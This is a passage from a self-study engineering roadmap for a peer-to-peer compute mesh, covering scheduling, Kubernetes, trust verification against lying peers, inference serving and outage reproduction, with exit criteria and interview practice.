- [ ] **Wasted-work metric:** CPU-seconds spent on jobs whose results were never delivered. In a volunteer mesh this is someone else's electricity — say so.
- [ ] **The adaptive limiter tracks a *changing* mesh capacity** — simulate 30% of peers leaving mid-test and show it adapt
- [ ] **Retry amplification measured and charted**, then bounded by a retry budget
- [ ] **A metastable failure reproduced, then made impossible.** Two graphs.
- [ ] **The deep-health-check cascade demonstrated:** show a shared-dependency blip taking the whole mesh out, then fix it (fail-open, cached health, liveness ≠ readiness)

## 7.3 — Kubernetes, observability without a centre, and `gatekeep`

> ### 🔥 THE WALL — six failures, caused deliberately
> 1. `CrashLoopBackOff` from a missing ConfigMap key
> 2. `Pending` forever — no node satisfies the resource request
> 3. **OOMKilled under a "generous" limit** — because the container limit counts *everything*, not just your Go heap. Set `GOMEMLIMIT` and re-run.
> 4. **CPU throttling** — give a peer `cpus=0.5`, watch p99 go to 400ms for 20ms of work. Find `nr_throttled` in `cpu.stat`. **Invisible from inside the container, and one of the most common causes of latency in Kubernetes.**
> 5. **Jobs dropped during a rolling update** — because readiness lies, and there's no `preStop` delay so the pod dies before endpoints propagate
> 6. **DNS latency** — every request +5ms, occasionally 5s. The `ndots:5` search-domain problem.
>
> **And the SWARM-specific one, which is the interesting one:** 🔴 **your telemetry has no central owner.** In a normal system every service ships metrics to one Prometheus. In a P2P mesh, *whose* Prometheus? A peer that leaves takes its metrics with it. A peer that lies about its metrics poisons your dashboards. **Observability in a system with no trusted centre is genuinely harder, and this is a section of the design doc that will make an interviewer sit up.**

### 📖 THEORY
- **The reconciliation loop** — etcd holds desired state, controllers drive actual → desired, the scheduler is just another controller, the kubelet reconciles pods. **Everything in Kubernetes is `while true { observe; diff; act }`.** If you internalise one thing, this.
- **What happens on `kubectl apply`** — client → API server → authN → authZ (RBAC) → admission (mutating, validating, webhooks) → etcd → watch event → scheduler binds → kubelet → CRI → CNI. **A top-5 most-asked Kubernetes interview question.**
- **cgroups v2** — `memory.max` vs `memory.high`, CPU shares vs quota, `GOMEMLIMIT`, why `nproc` lies inside a container. **You already used cgroups in Level 1 as a sandbox backstop; this is the same mechanism as an operational concern.**
- **Graceful shutdown** — SIGTERM → stop accepting → drain in-flight → exit within `terminationGracePeriodSeconds`. **Getting this wrong drops jobs on every deploy and almost every team has this bug.**
- **RED per service, USE per resource.** Histograms, not summaries — **you cannot average percentiles.** Cardinality as the thing that blows up the bill.
- **Observability in a trustless mesh** — self-reported metrics are *claims*, not facts. Which metrics can you verify independently (job completion, result hashes)? Which must you treat as untrusted (a peer's self-reported CPU load)? **This distinction directly feeds the Level 8 reputation model.**
- **`gatekeep`:** a private CA, per-peer short-lived certificates, **mTLS on every peer-to-peer connection** (peer identity is a certificate, and that identity is what reputation attaches to), authorisation at the gateway, secrets out of git, **certificate expiry alerting tested by fast-forwarding a clock.**

### 📄 SOURCES
- **Lukša, *Kubernetes in Action* 2nd ed. — ch. 1–7, 12, 17.**
- **"Kubernetes Failure Stories"** (`k8s.af`) — **read 10.** Highest learning-per-minute in the ecosystem.
- **Google SRE Workbook ch. 5, "Alerting on SLOs"** — multi-window multi-burn-rate alerting, explained properly.
- **Majors, Fong-Jones, Miranda, *Observability Engineering* — ch. 1–6.**
- **Gil Tene, "How NOT to Measure Latency"** *(F12 — audit your own harness this week)*.
- **RFC 8446 §2** (TLS 1.3 overview, 6 pages) + **Aumasson, *Serious Cryptography* 2nd ed. — ch. 1, 3, 9, 10, 11.**

📈 **EXIT CRITERIA — Level 7 / S7**
- [ ] Multi-stage Dockerfiles; `swarmd` image <80MB, `swarm-exec` <150MB; sizes recorded *(Docker 14.1%)*
- [ ] **`kubectl apply -k deploy/` brings up a 30-node mesh on local k3s from nothing** *(Kubernetes 29.7%)*
- [ ] **Rolling restart of all 30 peers with ZERO lost jobs**, under sustained submission. Harder than it sounds; it's the real lesson.
- [ ] Prometheus + Grafana; RED per component; **a dashboard you'd actually open at 3am** *(Observability 20.3%)*
- [ ] **`docs/design/trustless-observability.md`** — which metrics are independently verifiable, which are peer claims, and what you do about the difference
- [ ] Given an injected fault, **time-to-root-cause under 5 minutes using only the dashboards.** Demonstrate on video.
- [ ] **`gatekeep`:** mTLS everywhere; an unauthenticated peer is rejected (test); **peer identity = certificate identity, and reputation attaches to it**; no plaintext secret in git history (`gitleaks` in CI); expiry alert fires in the fast-forward test *(Security 10.9%)*
- [ ] **F12 audit done: if your benchmark harness had coordinated omission, every benchmark is re-run and the before/after is in `bench/RESULTS.md`**

⛓ **PROBLEM CHAIN**
```
"One slow peer poisoned p99"     → least-outstanding → P2C → deadline dropping
"Greedy-by-CPU starved memory jobs"→ multidimensional bin packing → NP-hard → heuristics
"Goodput collapsed at 3x"        → shed, don't queue → LIFO → adaptive limits
"Retries made it worse"          → amplification → budgets → metastable failure
"Deep health check killed everything"→ liveness ≠ readiness → fail-open
"Whose Prometheus?"              → trustless observability → verifiable vs claimed metrics (→ L8)
"A peer lied about its load"     → self-reported metrics are claims → reputation           (→ L8)
"Rolling restart dropped jobs"   → graceful drain → preStop → endpoint propagation
```

## 🎤 INTERVIEW PARAGRAPH — Week 30

> This level was scheduling and overload. Placement was the first surprise: I started with round-robin, made one peer ten times slower — not dead, just slow — and my end-to-end p99 became that peer's p99, while the health check said it was fine because it was still returning results. Least-outstanding-jobs and power-of-two-random-choices both fix it, and I have the chart. The harder part is that jobs have resource *vectors* — CPU, memory, sometimes GPU — so placement is multidimensional bin packing, which is NP-hard, and I measured how far my heuristic lands from a brute-force optimum on small instances rather than just asserting it was good.
>
> The graph I'd actually show you is goodput. I drove the mesh to five times its capacity with an open-loop generator and plotted successful completions per second. The naive scheduler doesn't plateau — it collapses toward zero, because it spends everything on jobs that will blow their deadline before they finish. And in a volunteer mesh that wasted work is someone else's electricity, which makes it an ethical point and not just an efficiency one. Six strategies on one chart, collapse next to graceful.
>
> And the thing that's genuinely different here: observability with no central owner. In a normal system everything ships metrics to one Prometheus. In a peer-to-peer mesh, whose? A peer that leaves takes its metrics with it, and a peer that lies poisons your dashboards. So I split metrics into ones I can verify independently — job completions, result hashes — and ones that are just a peer's *claim*, like its self-reported load. That distinction turned into the input for the reputation system I built the following month.

## 🎓 LEVEL 7 EXIT EXAM
1. The mesh runs at 70% utilisation with p99 of 800ms. Load rises 20%. Estimate the new p99 and name the model.
2. Why does round-robin turn one slow peer into a mesh-wide p99 problem? Give two fixes and their costs.
3. Explain coordinated omission and design a load test that avoids it.
4. Design a health check for a peer that depends on the content store. What breaks if you check the store?
5. You have a 5-second job deadline. Walk through every timeout in the path and justify each.
6. The mesh is at 3x capacity. Rank your options and justify the order.
7. What happens between `kubectl apply` and a running pod? 12+ steps.
8. Which of your metrics are facts and which are claims? What changes because of that?
9. What is a metastable failure? Give one from SWARM and its mitigation.

**Pass = 8/9.** *This is the level that separates candidates.*

**🔗 DSA companion (W27–30):** **heaps and priority queues** — job scheduling under load *is* a priority-queue problem; "task scheduler" and "meeting rooms" map directly. Plus **sliding window** (rate limiting is literally a sliding-window algorithm) and advanced graphs (SCC, bridges, articulation points — and articulation points are a real question about your mesh: which peer's removal partitions it?).

---
---

# ⚡ LEVEL 8 — Trust, Multi-Tenancy & Cloud

> **Goal:** decide whether to believe a stranger's answer, and prove how much it costs to be sure. **This level contains the project that makes you unique.**
> **⏱ Weeks 31–35 · Apr 5 – May 9 2027 · 90h** · **Milestone S8** · **🚩 Flagship #6: `trustcurve`** · **Core: `costwatch`** · **⚑ CV v3** · **W35 = buffer** · **Fundamentals F15, F16**

---

## 8.1 — 🚩 FLAGSHIP #6: `trustcurve` — how much does it cost to be sure?

> ### 🔥 THE WALL
> Submit a job. A peer returns a result. **Accept it.**
>
> Now inject a `LyingNode` — a peer that stays up, responds promptly, and returns a plausible wrong answer. **Nothing catches it.** Your job completed, your dashboard is green, your result is wrong, and there is no signal anywhere in the system that anything happened.
>
> **This is SWARM's core problem and every other project you could have built simply does not have it.**
>
> Then implement naive majority-of-three and feel safe. **Then replay the colluding-liars seed from Level 6** — two peers returning the *same* wrong answer — and watch three-way majority vote confidently accept it.

### 📖 THEORY

- **Why deterministic execution is the foundation.** Because WASM execution is deterministic (Level 1, verified with a 100-run identical-hash test), two honest peers running the same job on the same input produce a **bit-identical output hash.** Comparison is therefore exact, not fuzzy — no tolerance thresholds, no approximate agreement. **If you had chosen a non-deterministic executor in Level 1, none of this would work**, which is why that decision is ADR-0001 and why the determinism test exists in month one.
- **Redundant execution and majority vote** — run on N peers, compare output hashes, accept the majority. **The parameters:** what N, chosen how, and what happens on a tie or an N-way split.
- **This is not full BFT, and knowing the difference matters.** PBFT/Tendermint solve *agreement among mutually distrusting replicas on an ordering*, at O(N²) message complexity and enormous implementation cost. **SWARM needs something weaker and cheaper: agreement on a deterministic function's output.** Redundant execution + majority vote is the practical subset. **Being able to say precisely why you chose the lighter model — and what it does not protect you from — is worth more than a half-finished PBFT.**
- **Reputation** — a peer with a long history of agreeing with the majority needs less redundancy. This is the lever that makes verification affordable. **But it introduces new attacks:** build reputation honestly, then defect (the *sleeper*); Sybil identities to manufacture a fake majority (**mitigated here by the fact that peer identity is a certificate from your CA — say so, and say honestly that a real open mesh would need proof-of-work, staking, or a web of trust, none of which you built**).
- **What you can never fully solve, stated honestly:** a peer that is slow-but-correct wastes resources without lying. Collusion at scale defeats any majority scheme. A perfectly-timed defection by a high-reputation peer will get through once. **Verification is a cost/confidence dial, not a guarantee, and the whole point of this flagship is to *measure the dial* rather than pretend it's a switch.**

### 📄 SOURCES
- **DDIA ch. 9, the Byzantine faults section specifically.** Kleppmann's framing of when Byzantine tolerance is and isn't worth it is exactly the argument you're making.
- **Anderson, "BOINC: A System for Public-Resource Computing and Storage" (GRID 2004)**, plus **BOINC's own documentation on replication, quorum and the credit system.** This is twenty years of production experience with your exact problem. **Read it, cite it, and say plainly where your design agrees with theirs and where it differs.**
- **Castro & Liskov, "Practical Byzantine Fault Tolerance" (OSDI 1999)** — read the abstract and §1–2 so you can articulate what you deliberately did *not* build and why.
- **Douceur, "The Sybil Attack" (IPTPS 2002)** — short, and it is the honest limitation of any open reputation system.

### 🛠 THE BUILD · 45h — `swarmd/verify`

📈 **EXIT CRITERIA**
- [ ] **A single lying peer cannot corrupt an accepted result at N≥3** — proven by injecting the fault, with the seed
- [ ] **The colluding-liars case handled**, or its limits stated precisely: at what N and what collusion fraction does majority vote fail? **Compute the threshold and verify it in simulation.**
- [ ] Reputation model implemented: agreement history → a trust score → required redundancy for that peer's jobs
- [ ] **The sleeper attack tested:** a peer builds reputation for 1,000 jobs, then defects. **How many wrong results are accepted before the system notices?** That number is a real property of your design and it goes in the README.
- [ ] **🔴 THE CURVE — `docs/analysis/trustcurve.md`:** required redundancy (x) vs probability of accepting a wrong result (y), plotted as a family of curves for several assumed liar fractions (1%, 5%, 10%, 25%) and several reputation-history lengths. **Overlaid: the compute cost multiplier.** *This chart is the artifact. It does not exist anywhere publicly.*
- [ ] Measured overhead: total mesh compute with verification vs without, at each redundancy level
- [ ] **Reputation measurably reduces required redundancy for reliable peers** — the savings curve, with the trust-built-over-time axis
- [ ] `docs/design/trust-model.md` — the threat model, what you defend against, and **an explicit section on what you do NOT defend against** (Sybil in a truly open mesh, large-scale collusion, a perfectly-timed high-reputation defection)
- [ ] The TLA+ safety invariant from Level 6 still holds against the implemented protocol

> **Why this is a 10/10 flagship:** the premise is non-obvious, the artifact doesn't exist publicly, the correctness property is **silently violable** (a broken trust layer looks exactly like a working one), it demos in 60 seconds, and it has the best "and then it broke" story in the repo — *"my first majority-vote implementation confidently accepted a wrong answer, and my own simulator found it before I'd finished writing the layer."*

## 8.2 — Multi-tenancy: many users, one mesh

> ### 🔥 THE WALL
> One tenant submits 100x their normal job volume. **Every other tenant's jobs starve.** Measure the p99 degradation for the innocent tenants — it will be catastrophic.

### 📖 THEORY
Per-tenant quotas and concurrency caps · **weighted fair queuing** · **shuffle sharding** (AWS's technique: assign each tenant a random *subset* of peers, so one abusive tenant affects only the tenants sharing its shard — **the combinatorics chart showing blast-radius reduction is a great artifact and a great interview answer**) · per-tenant cost accounting (compute-seconds, storage-bytes, egress) — **the bridge between engineering and the business, and a strong senior signal** · tenant isolation in the content store.

### 📄 SOURCES
- **AWS Builders' Library, "Workload isolation using shuffle-sharding."**
- **The Kubernetes API Priority and Fairness (APF) design doc** — a real production fair-queuing design.

📈 **EXIT CRITERIA**
- [ ] **One tenant at 100x load: other tenants' job-completion p99 degrades by <10%.** Measured.
- [ ] Shuffle sharding implemented, with **the blast-radius combinatorics chart**: *"with 30 peers and shards of 4, one abusive tenant affects X% of other tenants."*
- [ ] Per-tenant cost report reconciling to total mesh compute within 5%
- [ ] A tenant hitting its quota is rejected cleanly with correct `429` semantics and `Retry-After`

## 8.3 — Cloud, ARM, and $0.00

> ### 🔥 THE WALL
> Deploy to Oracle's always-free instance. **`swarm-core` does not build.** It's ARM — x86 intrinsics, `-march=native` assumptions, alignment, and whatever SIMD you added to BLAKE3 in Level 3.
>
> Port it. Then re-run the whole benchmark suite on ARM and compare. **The delta will not be uniform across components** — hashing, DHT lookups, and the storage engine will move differently — and working out why is a free, genuinely interesting result that almost no candidate has.

### 📖 THEORY
**AWS, exactly the subset you need** — do **not** study for a certification; it closes no gap this week doesn't close better, with a running system as evidence instead of a badge:
**IAM** (roles vs users, assume-role, least privilege, **OIDC federation from CI so there are zero long-lived credentials in the repo** — the modern correct answer) · **VPC** (subnets, SGs vs NACLs, **NAT gateway cost** — the classic surprise bill) · **S3** (consistency model, storage classes, lifecycle, request-rate scaling by prefix — used here as an artifact mirror so a job's code survives every peer leaving) · **EC2** (t4g free tier) · **CloudWatch** (metrics, alarms, **the $1 billing alarm**).
**Cost as an architectural constraint** — most cloud bills are architecture problems wearing a finance costume.

### 🛠 CORE PROJECT — `costwatch` · 12h
All AWS-side infrastructure in Terraform (`apply` from zero, `destroy` to nothing) · **hand-written least-privilege IAM** verified with the policy simulator · a **CloudWatch billing alarm at $1, tested by deliberately triggering it** (an untested alarm is not an alarm) · **free-tier drift detection** that fails if any non-free-tier resource is created — this is what saves you when a copy-pasted module quietly provisions a NAT gateway.

### 🛠 THE GCP WINDOW — planned in advance, not leaked
`docs/design/gcp-window.md`, written **before** you spend a cent: **one 72-hour window running a 200-node real mesh on GCE**, for the single purpose of **validating the simulator at a scale your workstation cannot reach.** Budget alarm set, credit expiry recorded.

### 🛠 🔴 `docs/analysis/sim-fidelity.md` — the document that makes the simulator credible
Run the same experiments — DHT lookup hops under churn, gossip convergence time, goodput under overload — on the **real 40-node mesh** and on a **40-node simulation.** **Where do they agree, where do they diverge, and by how much?** Then use the GCP window's 200 real nodes to check **whether the divergence grows with scale.**

**A simulator you have not validated is a fantasy generator.** This document is what stops yours being one, and it is the answer to the sharpest question an interviewer can ask about this project.

📈 **EXIT CRITERIA — Level 8 / S8**
- [ ] Oracle always-free provisioned; k3s running; `swarm-relay` and 2 peers live, publicly reachable
- [ ] **`swarm-core` builds and passes all tests on aarch64**
- [ ] **`docs/analysis/arch.md`: x86 vs ARM across hashing, DHT lookup, storage engine, codec — per-component delta, attributed** to cache sizes, memory bandwidth, vector width
- [ ] Cross-cloud mesh: peers on Oracle and AWS **discover each other over the real internet** and exchange jobs; latency cost measured
- [ ] S3 used as an artifact mirror so job code survives all peers leaving; the durability argument written down
- [ ] Terraform: `apply` from zero, `destroy` to nothing. **Nothing configured by hand.**
- [ ] Billing alarm **tested by triggering it**
- [ ] **Monthly spend $0.00 on both clouds, verified from the consoles, screenshotted — every month from here**
- [ ] **`sim-fidelity.md` complete**, including the 200-node GCP validation
- [ ] `docs/design/slo.md` — SLOs with error budgets, **derived from measured numbers, not aspirational**
- [ ] **CV v3 written** (Track J)

⛓ **PROBLEM CHAIN**
```
"A peer lied and nothing caught it"→ redundant execution → majority vote
"Two liars agreed"                → collusion threshold → compute it, verify in sim
"Verification tripled my compute" → reputation → the trust/cost dial → THE CURVE
"A sleeper defected after 1000 jobs"→ how many wrong results got through? → that's a real number
"Sybil identities"                → certificate identity → and say what a real mesh would need
"One tenant starved everyone"     → quotas → fair queuing → shuffle sharding
"Free-tier box is ARM"            → port → and the per-component delta is a free result
"Is my simulator even right?"     → sim-fidelity → the sharpest question, answered
```

## 🎤 INTERVIEW PARAGRAPH — Week 35 (and CV v3)

> This is the level that's specific to what I built. Every distributed system has to handle nodes that crash; mine has to handle nodes that *lie*. So: jobs run on N peers, and because WASM execution is deterministic, two honest peers produce a bit-identical output hash — I verified that determinism with a hundred-run test back in month one, precisely because everything here depends on it. Compare the hashes, accept the majority.
>
> Then my own simulator broke it. I'd built a lying-node fault type in month six, and one of the seeds had two liars *colluding* — returning the same wrong answer — which a naive majority-of-three accepts with total confidence. So I computed the collusion threshold properly and verified it in simulation.
>
> The artifact I'd point you at is the trust curve. Verification isn't a switch, it's a dial: more redundancy buys more confidence and costs more compute, and reputation lets you spend less on peers with a track record. So I plotted required redundancy against probability of accepting a wrong result, as a family of curves for different assumed liar fractions and different reputation-history lengths, with the compute-cost multiplier overlaid. **BOINC has used redundancy for twenty years and nobody publishes that tradeoff curve. I did.** I also tested the sleeper attack — a peer that behaves for a thousand jobs then defects — and the number of wrong results accepted before the system notices is in the README, because it's a real property of my design and hiding it would be the wrong instinct. And I'm explicit about what I don't defend against: Sybil identities in a truly open mesh, large-scale collusion, and one perfectly-timed defection by a high-reputation peer.

## 🎓 LEVEL 8 EXIT EXAM
1. Why does deterministic execution make verification possible? What breaks without it?
2. Majority-of-three, one liar: safe. Two colluding liars: not. Derive the general threshold.
3. Why redundant execution + majority vote rather than PBFT? What did you give up?
4. Explain the sleeper attack. What's your detection latency, in jobs?
5. Sybil. Why doesn't it break *your* mesh, and why would it break a real open one?
6. A tenant sends 100x. Name three isolation mechanisms and the blast radius of each.
7. Your simulator says X, the real mesh says Y. What do you do, and what does the gap tell you?
8. Your cloud bill is $0.00. Name three ways it becomes $400 next month, and the control for each.

**Pass = 7/8.**

> ### 🚩 TWO-THIRDS GATE — end of Week 35
> Eight months in. **The employment-critical half is built.** From here: the AI layer (L9), operations (L10), conversion (L11–12).
> **More than two weeks behind? Cut Level 11 scope** — the dashboard and `pgshift` are droppable, in that order. **Do not cut Level 10.** On-call is 16.4% and nothing else in this plan closes it.

**🔗 DSA companion (W31–35):** **DP and greedy** — "minimum redundancy to achieve X confidence" is a genuine optimisation problem with real DP structure, and you are solving it for real this month. Plus segment trees and Fenwick trees (Codeforces EDU), binary lifting, and string algorithms.

---
---

# ⚡ LEVEL 9 — AI Infrastructure: The Mesh as an Inference Marketplace

> **Goal:** inference as a **job type the mesh routes**, not a gateway bolted on the side.
> **⏱ Weeks 36–39 · May 10 – Jun 6 2027 · 65h** · **Milestone S9** · **🚩 Flagship #7: `llm-peer`** · **W39 = REST WEEK**
>
> **Eid al-Adha ≈ May 16–19 falls in Week 37** — budgeted at 26h.
>
> **CPU-first by design.** Quantized GGUF models (1–3B) via `llama.cpp` run on any peer. **A GPU is an accelerator, not a requirement**, and capability advertisement is exactly how the mesh expresses that difference. Nothing in this level assumes hardware you may not have.

---

## 9.1 — What breaks when the job is inference

> ### 🔥 THE WALL — four failures in one afternoon
> Wire a model into a peer as an ordinary job and submit ten concurrent inference requests.
> 1. **Time-to-first-token is 8 seconds** under concurrency, because you're processing requests one at a time with the GPU or CPU idle between them.
> 2. **You pay for the same system prompt ten thousand times a day.** Every request re-processes an identical 800-token prefix.
> 3. **One user's 100k-token request blocks everyone**, because your job model has no notion of a request that produces output incrementally over minutes.
> 4. **A client disconnects and generation continues**, burning a volunteer peer's electricity to produce tokens nobody will read. **In a volunteer mesh this is not just waste — it's someone else's power bill.**
>
> **And the one unique to SWARM:** kill the executing peer mid-generation. **The requester is billed for a partial result they never received, and the re-routed job starts from zero and bills again.**

### 📖 THEORY
- **Prefill vs decode.** Prefill is compute-bound and parallel over the prompt; decode is memory-bandwidth-bound and strictly sequential, one token at a time. **This asymmetry explains nearly every performance property of inference serving**, and it's why a job that "takes 4 seconds" behaves nothing like a 4-second compute job.
- **The metrics that matter:** **time-to-first-token (TTFT)** and **inter-token latency**, not end-to-end p99 — which is the wrong metric for a streaming response and the one everyone reports.
- **Continuous / in-flight batching** — the single biggest throughput win. Static batching wastes the accelerator waiting for the slowest sequence in the batch.
- **KV cache and prefix caching** — the KV cache dominates memory; **caching a shared prompt prefix across requests is often a 50%+ cost reduction for free.** Measure it.
- **Token-aware admission** — requests-per-second is the wrong unit. You need tokens-per-minute, and you must **estimate cost before admitting**, which connects straight back to Level 7's admission control.
- **Streaming through a mesh** — tokens flow peer → requester incrementally. **Cancellation must propagate** and actually stop generation, verified by a token-count measurement, not assumed.
- **Metered billing with at-least-once execution** — the hard one. **Bill for tokens actually delivered and acknowledged, keyed by the job's content hash, so a re-execution after a peer death does not double-bill.** This is the same idempotency problem as Level 5's assignment, in a new costume, and recognising that is the point.

### 📄 SOURCES
- **Kwon et al., "Efficient Memory Management for Large Language Model Serving with PagedAttention" (SOSP 2023)** — the vLLM paper. The clearest explanation of why inference serving is hard.
- **`llama.cpp` documentation** on GGUF quantization and the server's batching model — this is what you'll actually run.
- **Chip Huyen, *AI Engineering* (2025)** — the systems-oriented chapters on serving and evaluation.
- **vLLM / SGLang docs** on continuous batching and prefix caching, for the mechanisms.

### 🛠 🚩 FLAGSHIP #7: `llm-peer` · 50h

📈 **EXIT CRITERIA**
- [ ] **Capability advertisement**: peers publish what they can serve (model, quantization, context length, CPU/GPU). An inference job is **only** routed to a capable peer — asserted by a test.
- [ ] **Streaming end-to-end through the mesh**, not point-to-point: tokens flow executor → region → requester incrementally
- [ ] **Cancellation propagates and provably stops generation** — show the token count for a cancelled request
- [ ] **TTFT and inter-token latency measured**, with and without continuous batching, as a chart
- [ ] **Prefix caching: ≥40% measured cost reduction** on a realistic workload with a shared system prompt. Report cache hit rate **and** any output difference.
- [ ] Token-aware admission: cost estimated before admitting; a tenant's token budget holds; **no over-spend**
- [ ] **🔴 Kill the executing peer mid-generation: the job re-routes and completes, and the requester is NOT double-billed.** Content-hash-keyed accounting. This is the criterion that ties the AI layer to everything you built in Levels 5 and 8.
- [ ] A verification story for inference: **inference is not bit-deterministic across peers** (different quantization, different hardware, different batch composition). **State this honestly, and state what you do instead** — restrict inference jobs to a reputation threshold rather than pretending majority vote works. **This is a limitation the trust layer genuinely cannot cover, and saying so is stronger than papering over it.**
- [ ] Per-tenant cost dashboard reconciling to mesh compute

⛓ **PROBLEM CHAIN**
```
"TTFT is 8s under load"        → continuous batching → prefill/decode asymmetry
"Paying for the same prefix"   → prefix caching → measure the hit rate
"Client left, generation continued"→ cancellation propagation → someone else's electricity
"Peer died mid-generation, billed twice"→ content-hash accounting → the same idempotency problem (→ L5)
"Two peers gave different tokens"→ inference isn't deterministic → majority vote DOESN'T apply
"...so how do you trust it?"   → reputation threshold instead → and say the limitation out loud
```

## 🎤 INTERVIEW PARAGRAPH — Week 39

> The mesh serves model inference now, but as a *job type* rather than a separate gateway — peers advertise what they can serve, and the scheduler I built two months earlier routes to a capable one. Four things surprised me. Inference isn't a normal job: prefill is compute-bound and parallel, decode is memory-bandwidth-bound and strictly sequential, so a four-second inference behaves nothing like a four-second compute job and end-to-end p99 is the wrong metric — it's time-to-first-token and inter-token latency. Prefix caching gave me over forty percent cost reduction for free, because everyone was paying to re-process the same eight-hundred-token system prompt. Cancellation had to actually propagate and stop generation, and in a volunteer mesh that isn't an efficiency point, it's someone else's electricity. And the one that tied everything together: killing the executing peer mid-generation double-billed the requester, because the re-routed job started from zero. That's the same idempotency problem as job assignment from month five, wearing a different costume, and the fix is the same — account by content hash.
>
> The honest limitation is that inference is **not** bit-deterministic across peers. Different quantization, different hardware, different batch composition give different tokens. So my majority-vote verification layer, which works perfectly for deterministic compute, simply does not apply here. I don't pretend it does — inference jobs are restricted to peers above a reputation threshold instead, and that's stated in the README as a gap rather than hidden.

## 🎓 LEVEL 9 EXIT EXAM
1. Prefill vs decode: which is compute-bound, which is bandwidth-bound, and what follows for batching?
2. Why is end-to-end p99 the wrong metric for streaming? What replaces it?
3. Explain continuous batching and why static batching wastes the accelerator.
4. A client disconnects mid-stream. What must happen, and how do you prove it did?
5. A peer dies at token 400 of 1000. Walk through re-routing and billing.
6. Why can't majority-vote verification be applied to inference? What do you do instead, and what does that cost you?
7. Token-aware rate limiting: why is requests-per-second wrong, and how do you estimate before admitting?

**Pass = 6/7.**

**🔗 DSA companion (W36–39):** probability and expectation (the trust curve and reputation are probabilistic reasoning you are doing for real), randomised algorithms, reservoir sampling and sketching. **W38: FULL TIMED LOOP #1.**

---
---

# ⚡ LEVEL 10 — Operations, Chaos & On-Call

> **Goal:** close the gap with the least alternative route — **On-call, 16.4%** — and **start applying.**
> **⏱ Weeks 40–43 · Jun 7 – Jul 4 2027 · 48h depth** · **🚩 Flagship #8: `incident-lab`** · **⚑ CV v4** · **🎯 APPLICATIONS OPEN W40** · **W43 = buffer**
>
> **The split changes from Week 40: 12h Depth / 12h Interview / 6h Career.** Applications are live; interview readiness is now the binding constraint.

---

## 10.1 — 🚩 FLAGSHIP #8: `incident-lab`

> **The most unique thing in this roadmap, and the artifact that closes On-call 16.4% and Observability 20.3%.** Every one of these took down a multi-billion-dollar company, was written up publicly in detail, and has a reproducible core mechanism.

### Part A — Eight famous outages, reproduced locally

**For each:** read the postmortem → **build a minimal local reproduction** → observe the failure with instrumentation → implement the fix → write your own analysis. 4–8h each; **do six minimum.**

| # | Incident | The mechanism | What it teaches you about SWARM |
|---|---|---|---|
| 1 | **AWS S3, Feb 2017** | An operator command removed far more capacity than intended; the restart path had never been tested at that scale | **Never-tested recovery paths — your region-rejoin path is one, and you have never run it at 30 peers** |
| 2 | **GitHub, Oct 2018** | A 43-second partition triggered automated failover; both sides accepted conflicting writes → 24h of manual reconciliation | **Split-brain.** You built Raft to prevent exactly this. Reproduce it *without* Raft, then show your version surviving. |
| 3 | **Cloudflare, July 2019** | A regex with catastrophic backtracking deployed globally in one step consumed 100% CPU on every edge machine | **Global config deploys need staged rollout — and your mesh distributes job code to strangers' machines** |
| 4 | **Meta, Oct 2021** | A backbone change withdrew BGP routes for authoritative DNS; the company vanished — **including the internal tools needed to fix it** | 🔴 **Circular dependency in recovery. Your bootstrap relay is a single point of failure and your admin surface may depend on the mesh it administers. Check this.** |
| 5 | **Slack, Jan 2021** | Traffic ramp → slow autoscaling → cascading saturation with a retry-driven feedback loop | **Metastable failure.** You reproduced one in Level 7; this is the production version. |
| 6 | **Roblox, Oct 2021 (73 hours)** | Consul streaming under load → contention → couldn't recover; **and the observability system depended on the failed cluster** | 🔴 **Your monitoring must not depend on the mesh it monitors — and in a P2P system that is genuinely hard.** |
| 7 | **GitLab, 2017** | `rm -rf` on the wrong host during an incident — then the discovery that **5 of 5 backup methods had silently been failing** | **Untested backups are not backups. Your S3 artifact mirror is a backup you have never restored from.** |
| 8 | **Cache stampede / thundering herd** (many companies) | Cache tier restart or mass expiry → origin sees 20–100x load → collapse | **You will cause the mesh version of this when 30 peers rejoin simultaneously after a network blip.** |

**Bonus if hours allow:** Knight Capital 2012 (partial deploy + reused feature flag, $440M in 45 minutes — **and you deploy to peers you don't control**); CrowdStrike 2024 (untested content update, no staged rollout, no safe rollback — the largest IT outage in history).

**Deliverable per reproduction:** `docker compose up` for the minimal system · a trigger script · **instrumentation showing the failure as it happens** · the fix applied with the same trigger now harmless · and a written analysis naming **the trigger, the amplifier, the containment failure, the recovery obstacle, and the three controls that would have prevented or bounded it.**

### Part B — Twenty incidents in your own mesh

Scripted, repeatable failure injection against the deployed SWARM. **≥20 logged incidents**, each with: the alert that fired (**or the alert that should have and did not**), a timestamped timeline, root cause, and a runbook entry.

**Injections:** peer kill · **asymmetric partition** · region leader kill mid-commit · disk fill on a peer holding replicas · relay node death (**this is your bootstrap SPOF — what actually happens?**) · certificate expiry · content-store corruption · **30 peers rejoining simultaneously** · a peer with a full disk accepting jobs it can't store · Kafka consumer lag on the audit plane · **a lying peer at scale** · memory pressure · slow-but-correct peer.

> ### 🔥 THE CLOCK SKEW INCIDENT — do this one properly
> Skew one peer's clock by four seconds. **Nothing fails loudly.**
>
> Leases expire early or late. The failure detector's phi-accrual model is fed wrong inter-arrival times. Job deadlines are computed against a clock that disagrees with the region's. **The peer doesn't crash — it silently makes wrong decisions while your dashboards stay green and your error rate stays zero.**
>
> Then write the invariant check that catches it: **peers report their clock offset relative to the region leader's, and a peer beyond a threshold is quarantined from lease-holding.** And note the deeper lesson — you built fencing tokens in Level 5 precisely because you cannot trust a clock, and this is the incident that proves you were right to.

### 📄 SOURCES
- **Michael Nygard, *Release It!* 2nd ed.** — the origin of circuit breaker and bulkhead as named patterns. **The single most relevant book to this level.**
- **Google SRE Book ch. 21, 22.** Ch. 22 (cascading failures) is the most valuable chapter in the book.
- **`github.com/danluu/post-mortems`** — read one a week for the rest of the year.
- **Bronson et al., "Metastable Failures in Distributed Systems" (HotOS 2021).**
- **Lamport, "Time, Clocks, and the Ordering of Events" (1978)** — eight pages, the most cited paper in the field.
- **Google SRE Workbook ch. 5** — multi-window multi-burn-rate alerting.

📈 **EXIT CRITERIA — Level 10**
- [ ] **≥6 famous outages reproduced**, each with before/after and a written analysis
- [ ] **🔴 The synthesis essay: "the seven mechanisms behind every major outage."** You will find them — config changes · circular dependencies in recovery · untested recovery paths · retry amplification · cold caches and thundering herds · silent backup or validation failure · unbounded resource growth. **Published.**
- [ ] **≥20 incidents in SWARM**, each with alert, timeline, root cause, runbook entry
- [ ] **The clock-skew incident done properly**, with the quarantine invariant
- [ ] **The relay-SPOF incident:** kill the bootstrap node. What happens to the mesh? **Write the honest answer, and the mitigation you did or didn't build.**
